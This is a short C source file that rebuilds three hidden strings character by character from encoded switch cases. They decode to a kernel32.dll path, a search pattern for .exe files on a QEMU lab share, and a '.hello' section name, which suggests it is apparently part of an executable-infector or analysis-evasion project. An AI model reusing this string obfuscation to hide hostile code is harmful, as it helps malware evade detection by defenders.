#include "string_generator.h"

size_t get_string_length(uint16_t id) {
    switch (id) {
    case STRING_KERNEL32_PATH:
        return 32;
    case STRING_EXE_SEARCH_PATTERN:
        return 28;
    case STRING_SECTION_NAME:
        return 6;
    default:
        return 0;
    }
}

size_t get_string(uint16_t id, char *dest, size_t dest_size) {
    size_t len = get_string_length(id);
    if (len == 0 || len >= dest_size) {
        return 0;
    }
    for (size_t index = 0; index < len; index++) {
        switch (id | (((uint16_t)index) << 8)) {
        case 5632:
        case 4609:
            dest[index] = 'r';
            break;
        case 1792:
        case 1282:
            dest[index] = 'o';
            break;
        case 256:
            dest[index] = ':';
            break;
        case 2817:
            dest[index] = 'q';
            break;
        case 3840:
        case 5376:
        case 6144:
        case 3073:
        case 5121:
        case 6401:
        case 6913:
        case 514:
            dest[index] = 'e';
            break;
        case 769:
        case 1281:
            dest[index] = '0';
            break;
        case 3072:
            dest[index] = 'y';
            break;
        case 1280:
        case 5888:
            dest[index] = 'n';
            break;
        case 7168:
        case 1025:
        case 1537:
        case 2049:
        case 6145:
        case 2:
            dest[index] = '.';
            break;
        case 3585:
            dest[index] = 'u';
            break;
        case 0:
            dest[index] = 'c';
            break;
        case 5120:
            dest[index] = 'k';
            break;
        case 2304:
        case 2816:
        case 3328:
            dest[index] = 's';
            break;
        case 4865:
            dest[index] = 'g';
            break;
        case 258:
            dest[index] = 'h';
            break;
        case 3584:
        case 4097:
        case 5377:
            dest[index] = 't';
            break;
        case 4352:
        case 6656:
            dest[index] = '3';
            break;
        case 512:
        case 2560:
        case 4864:
        case 1:
        case 257:
        case 2561:
        case 3841:
        case 5633:
            dest[index] = '\\';
            break;
        case 2305:
            dest[index] = '4';
            break;
        case 4608:
        case 6912:
        case 1793:
            dest[index] = '2';
            break;
        case 4353:
            dest[index] = 'a';
            break;
        case 6657:
            dest[index] = 'x';
            break;
        case 6400:
        case 7680:
        case 7936:
        case 770:
        case 1026:
            dest[index] = 'l';
            break;
        case 1536:
        case 7424:
            dest[index] = 'd';
            break;
        case 768:
        case 2048:
            dest[index] = 'w';
            break;
        case 4096:
        case 3329:
            dest[index] = 'm';
            break;
        case 1024:
            dest[index] = 'i';
            break;
        case 5889:
            dest[index] = '*';
            break;
        case 513:
            dest[index] = '1';
            break;
        default:
            return 0;
        }
    }
    dest[len] = 0;
    return len + 1;
}
